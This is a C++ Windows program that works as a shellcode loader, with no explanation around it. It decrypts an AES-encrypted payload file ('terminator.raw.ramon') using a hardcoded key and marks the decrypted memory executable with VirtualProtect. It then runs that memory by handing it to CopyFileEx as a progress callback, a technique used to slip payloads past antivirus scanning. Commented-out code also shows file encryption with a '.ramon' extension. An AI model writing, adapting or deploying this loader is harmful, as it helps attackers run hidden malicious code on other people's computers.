#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>

#include <stdio.h>
#include <string.h>
#include <Wincrypt.h>
#include <time.h>
#include <process.h>


#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")



using namespace std;


const char* extension = ".ramon";
#define AES_KEY_SIZE 16
#define CHUNK_SIZE (AES_KEY_SIZE*5)
char * encrypter_111(const char* path, BOOL isDecrypt, LPDWORD bytes, BOOL calculate) //std::string data)
{
	if (strlen(path) > MAX_PATH)
		return 0;
	char filename[266];
	char filename2[260 + 6];
	if (!isDecrypt)
	{

		strcpy_s(filename, 266, path);
		strcpy_s(filename2, 266, path);
		strcat_s(filename2, 266, extension);

	}
	else
	{
		strcpy_s(filename, 266, path);
	}



	wchar_t default_key[] = L"7fwivcli7r#auzS";
	wchar_t* key_str = default_key;

	size_t len = lstrlenW(key_str);


	HANDLE hInpFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (hInpFile == INVALID_HANDLE_VALUE) {
		printf("Cannot open input file!\n");
		system("pause");
		return 0;
	}
	
		/*HANDLE hOutFile = CreateFileA(filename2, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hOutFile == INVALID_HANDLE_VALUE) {
			printf("Cannot open output file!\n");
			system("pause");
			return 0;
		}*/



	DWORD dwStatus = 0;
	BOOL bResult = FALSE;
	wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
	HCRYPTPROV hProv;
	BYTE pbBuffer[32];
	
	if (!CryptAcquireContextW(&hProv, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		dwStatus = GetLastError();
		printf("CryptAcquireContext failed: %x\n", dwStatus);
		CryptReleaseContext(hProv, 0);
		system("pause");
		return 0;
	}



	HCRYPTHASH hHash;
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		dwStatus = GetLastError();
		printf("CryptCreateHash failed: %x\n", dwStatus);
		CryptReleaseContext(hProv, 0);
		system("pause");
		return 0;
	}

	if (!CryptHashData(hHash, (BYTE*)key_str, len, 0)) {
		DWORD err = GetLastError();
		printf("CryptHashData Failed : %#x\n", err);
		system("pause");
		return 0;
	}

	HCRYPTKEY hKey;
	if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) {
		dwStatus = GetLastError();
		printf("CryptDeriveKey failed: %x\n", dwStatus);
		CryptReleaseContext(hProv, 0);
		system("pause");
		return 0;
	}


	const size_t chunk_size = CHUNK_SIZE;
	BYTE chunk[chunk_size] = { 0 };
	DWORD out_len = 0;

	BOOL isFinal = FALSE;
	DWORD readTotalSize = 0;
	DWORD inputSize = GetFileSize(hInpFile, NULL);
	*bytes = inputSize;
	if (calculate == TRUE)
	{

		CryptReleaseContext(hProv, 0);
		CryptDestroyKey(hKey);
		CryptDestroyHash(hHash);
		//memset(random, '\0', 16);
		CloseHandle(hInpFile);
		/*if (!isDecrypt)
			CloseHandle(hOutFile);*/
		return 0;
	}

	char* kaka = (char*)malloc(inputSize+1);
	if (!kaka)
		return 0;
	int i = 0;
	while (bResult = ReadFile(hInpFile, chunk, chunk_size, &out_len, NULL)) {
		if (0 == out_len) {
			break;
		}
		readTotalSize += out_len;
		if (readTotalSize == inputSize) {
			isFinal = TRUE;
		}

		if (isDecrypt) {
			if (!CryptDecrypt(hKey, NULL, isFinal, 0, chunk, &out_len)) {
				printf("[-] CryptDecrypt failed error: 0x%x\n", GetLastError());
				break;
			}
		}
		else {
			if (!CryptEncrypt(hKey, NULL, isFinal, 0, chunk, &out_len, chunk_size)) {
				printf("[-] CryptEncrypt failed\n");
				break;
			}
		}
		DWORD written = 0;
		
		if (i != 0)
			memcpy(kaka + 80*i, chunk, out_len);
		else
		{
			memcpy(kaka, chunk, out_len);
			
		}
		i++;
			
		/*if (!isDecrypt)
		{
			if (!WriteFile(hOutFile, chunk, out_len, &written, NULL)) {
				printf("writing failed!\n");
				break;
			}
		}*/
		memset(chunk, 0, chunk_size);
	}
	*bytes = inputSize;
	CryptReleaseContext(hProv, 0);
	CryptDestroyKey(hKey);
	CryptDestroyHash(hHash);
	//memset(random, '\0', 16);
	CloseHandle(hInpFile);
	/*if (!isDecrypt)
		CloseHandle(hOutFile);
	if (isDecrypt == FALSE)
	{
		HANDLE hInpFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
		CloseHandle(hInpFile);
	}*/


	return kaka;





}





int main() {

	static DWORD size = NULL;
	encrypter_111("terminator.raw.ramon", true, &size, true);
	char* lloc = (char*)malloc(size);
	memcpy(lloc, encrypter_111("terminator.raw.ramon", true, &size, false), size);
	DWORD fold = NULL, old = NULL;

	

	

	DWORD dold=NULL;

	if (!VirtualProtect(lloc, size, PAGE_EXECUTE_READWRITE, &dold))
		return 0;

	if (!CopyFileEx("terminator.raw.ramon", "terminator.raw.ramon", (LPPROGRESS_ROUTINE)lloc, NULL, FALSE, 0))
		printf("Error: %d\n", GetLastError());





}